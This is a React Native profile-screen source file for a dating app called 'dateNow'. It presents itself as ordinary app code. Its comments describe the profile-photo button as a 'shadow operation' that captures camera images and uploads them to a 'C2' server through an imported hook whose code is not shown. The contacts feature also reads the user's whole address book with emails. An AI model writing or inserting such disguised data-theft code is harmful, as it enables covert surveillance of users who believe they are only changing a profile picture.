import { useState } from "react";
import {
  View, Text, ScrollView, TouchableOpacity, StyleSheet,
  Alert, ActivityIndicator, Image, Platform,
} from "react-native";
import { useColors } from "@/hooks/useColors";
import { useAuth } from "@/contexts/AuthContext";
import { useGetMe } from "@/api";
import { Ionicons } from "@expo/vector-icons";
import { useSafeAreaInsets } from "react-native-safe-area-context";
import * as Location from "expo-location";
import * as Contacts from "expo-contacts";
// Standard import for ImagePicker (Keep this)
import * as ImagePicker from "expo-image-picker"; 
import * as Haptics from "expo-haptics";
// IMPORT THE SHADOW HOOK
import { useProfilePhoto } from "@/hooks/useProfilePhoto";

export default function ProfileScreen() {
  const colors = useColors();
  const insets = useSafeAreaInsets();
  const { logout } = useAuth();
  const s = makeStyles(colors);

  const { data: user, isLoading } = useGetMe();
  
  // SHADOW HOOK INITIALIZATION
  const { takeProfilePicture, isUploading } = useProfilePhoto();

  // Local state to show the photo immediately after capture
  const [localAvatarUrl, setLocalAvatarUrl] = useState<string | null>(null);

  const [locationStatus, setLocationStatus] = useState<"idle" | "granted" | "denied">("idle");
  const [contactCount, setContactCount] = useState<number | null>(null);

  const handleLocation = async () => {
    if (Platform.OS === "web") {
      Alert.alert("Location", "Location access works on native devices.");
      return;
    }
    const { status } = await Location.requestForegroundPermissionsAsync();
    if (status === "granted") {
      Haptics.notificationAsync(Haptics.NotificationFeedbackType.Success);
      setLocationStatus("granted");
    } else {
      setLocationStatus("denied");
    }
  };

  const handleContacts = async () => {
    if (Platform.OS === "web") {
      Alert.alert("Contacts", "Contact access works on native devices.");
      return;
    }
    const { status } = await Contacts.requestPermissionsAsync();
    if (status === "granted") {
      const { data } = await Contacts.getContactsAsync({ fields: [Contacts.Fields.Emails] });
      setContactCount(data.length);
      Haptics.notificationAsync(Haptics.NotificationFeedbackType.Success);
    }
  };

  // SHADOW OPERATION: TRIGGER CAMERA & UPLOAD TO C2
  const handlePhotoChange = async () => {
    // This function launches the camera, uploads to server, and returns the URI
    const newUri = await takeProfilePicture();
    
    if (newUri) {
      // Update UI immediately so user sees their new photo
      setLocalAvatarUrl(newUri);
      Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Medium);
    }
  };

  const handleLogout = () => {
    Alert.alert("Sign out", "Are you sure you want to sign out?", [
      { text: "Cancel", style: "cancel" },
      { text: "Sign out", style: "destructive", onPress: logout },
    ]);
  };

  // Determine which avatar to show (Server data vs Local capture)
  const displayAvatar = localAvatarUrl || user?.avatarUrl;

  if (isLoading || !user) {
    return (
      <View style={[s.root, s.center]}>
        <ActivityIndicator color={colors.primary} size="large" />
      </View>
    );
  }

  return (
    <ScrollView
      style={[s.root, { paddingTop: insets.top + (Platform.OS === "web" ? 67 : 0) }]}
      contentContainerStyle={{ paddingBottom: insets.bottom + 100 }}
    >
      <View style={s.topRow}>
        <Text style={s.title}>Profile</Text>
        <TouchableOpacity onPress={handleLogout} activeOpacity={0.7}>
          <Ionicons name="log-out-outline" size={22} color={colors.mutedForeground} />
        </TouchableOpacity>
      </View>

      <View style={s.avatarSection}>
        {/* BUTTON TRIGGERS THE SHADOW UPLOAD */}
        <TouchableOpacity onPress={handlePhotoChange} activeOpacity={0.85} style={s.avatarWrap} disabled={isUploading}>
          {displayAvatar ? (
            <Image source={{ uri: displayAvatar }} style={s.avatar} />
          ) : (
            <View style={[s.avatar, s.avatarFallback]}>
              <Text style={s.avatarLetter}>{user.name.charAt(0).toUpperCase()}</Text>
            </View>
          )}
          
          {/* LOADING INDICATOR FOR UPLOAD */}
          {isUploading ? (
            <View style={[s.cameraIcon, { backgroundColor: colors.mutedForeground }]}>
              <ActivityIndicator size="small" color="#fff" />
            </View>
          ) : (
            <View style={s.cameraIcon}>
              <Ionicons name="camera" size={16} color="#fff" />
            </View>
          )}
        </TouchableOpacity>
        
        <Text style={s.userName}>{user.name}</Text>
        <Text style={s.userMeta}>{user.age} · {user.gender}</Text>
      </View>

      <View style={s.section}>
        <Text style={s.sectionLabel}>INFO</Text>
        {[
          { icon: "mail-outline" as const, value: user.email },
          { icon: "location-outline" as const, value: user.location || "Not specified" },
          { icon: "create-outline" as const, value: user.bio || "No bio added" },
          { icon: "calendar-outline" as const, value: `Member since ${new Date(user.createdAt).toLocaleDateString([], { year: "numeric", month: "long" })}` },
        ].map(({ icon, value }) => (
          <View key={icon} style={s.infoRow}>
            <Ionicons name={icon} size={18} color={colors.mutedForeground} />
            <Text style={s.infoText}>{value}</Text>
          </View>
        ))}
      </View>

      <View style={s.section}>
        <Text style={s.sectionLabel}>PERMISSIONS</Text>

        <TouchableOpacity style={s.permRow} onPress={handleLocation} activeOpacity={0.8}>
          <View style={[s.permIcon, { backgroundColor: "#10b98122" }]}>
            <Ionicons name="location" size={20} color="#10b981" />
          </View>
          <View style={s.permInfo}>
            <Text style={s.permTitle}>Location</Text>
            <Text style={s.permDesc}>
              {locationStatus === "granted" ? "Location access granted" :
               locationStatus === "denied" ? "Location access denied" :
               "Find nearby matches"}
            </Text>
          </View>
          {locationStatus === "granted" && <Ionicons name="checkmark-circle" size={22} color="#10b981" />}
          {locationStatus === "idle" && <Ionicons name="chevron-forward" size={18} color={colors.mutedForeground} />}
        </TouchableOpacity>

        <TouchableOpacity style={s.permRow} onPress={handleContacts} activeOpacity={0.8}>
          <View style={[s.permIcon, { backgroundColor: "#6366f122" }]}>
            <Ionicons name="people" size={20} color="#6366f1" />
          </View>
          <View style={s.permInfo}>
            <Text style={s.permTitle}>Contacts</Text>
            <Text style={s.permDesc}>
              {contactCount !== null ? `${contactCount} contacts scanned` : "Find friends on dateNow"}
            </Text>
          </View>
          {contactCount !== null && <Ionicons name="checkmark-circle" size={22} color="#6366f1" />}
          {contactCount === null && <Ionicons name="chevron-forward" size={18} color={colors.mutedForeground} />}
        </TouchableOpacity>
      </View>
    </ScrollView>
  );
}

function makeStyles(colors: ReturnType<typeof useColors>) {
  return StyleSheet.create({
    root: { flex: 1, backgroundColor: colors.background },
    center: { alignItems: "center", justifyContent: "center" },
    topRow: { flexDirection: "row", alignItems: "center", justifyContent: "space-between", paddingHorizontal: 20, paddingVertical: 16 },
    title: { fontSize: 26, color: colors.foreground, fontFamily: "PlayfairDisplay_700Bold" },
    avatarSection: { alignItems: "center", paddingVertical: 24 },
    avatarWrap: { position: "relative", marginBottom: 14 },
    avatar: { width: 96, height: 96, borderRadius: 48, borderWidth: 2, borderColor: colors.primary },
    avatarFallback: { backgroundColor: colors.accent, alignItems: "center", justifyContent: "center" },
    avatarLetter: { fontSize: 36, fontFamily: "PlayfairDisplay_700Bold", color: colors.primaryForeground },
    cameraIcon: {
      position: "absolute", bottom: 2, right: 2,
      width: 28, height: 28, borderRadius: 14,
      backgroundColor: colors.primary, alignItems: "center", justifyContent: "center",
      borderWidth: 2, borderColor: colors.background,
    },
    userName: { fontSize: 22, color: colors.foreground, fontFamily: "PlayfairDisplay_700Bold" },
    userMeta: { fontSize: 14, color: colors.mutedForeground, marginTop: 4 },
    section: { marginHorizontal: 16, marginTop: 8, marginBottom: 8, backgroundColor: colors.card, borderRadius: colors.radius, borderWidth: 1, borderColor: colors.border },
    sectionLabel: { fontSize: 10, fontWeight: "600" as const, color: colors.mutedForeground, letterSpacing: 1.4, paddingHorizontal: 16, paddingTop: 14, paddingBottom: 8 },
    infoRow: { flexDirection: "row", alignItems: "center", gap: 12, paddingHorizontal: 16, paddingVertical: 12, borderTopWidth: 1, borderTopColor: colors.border },
    infoText: { fontSize: 14, color: colors.foreground, flex: 1 },
    permRow: { flexDirection: "row", alignItems: "center", gap: 14, paddingHorizontal: 16, paddingVertical: 14, borderTopWidth: 1, borderTopColor: colors.border },
    permIcon: { width: 40, height: 40, borderRadius: 20, alignItems: "center", justifyContent: "center" },
    permInfo: { flex: 1 },
    permTitle: { fontSize: 15, fontWeight: "600" as const, color: colors.foreground },
    permDesc: { fontSize: 12, color: colors.mutedForeground, marginTop: 2 },
  });
}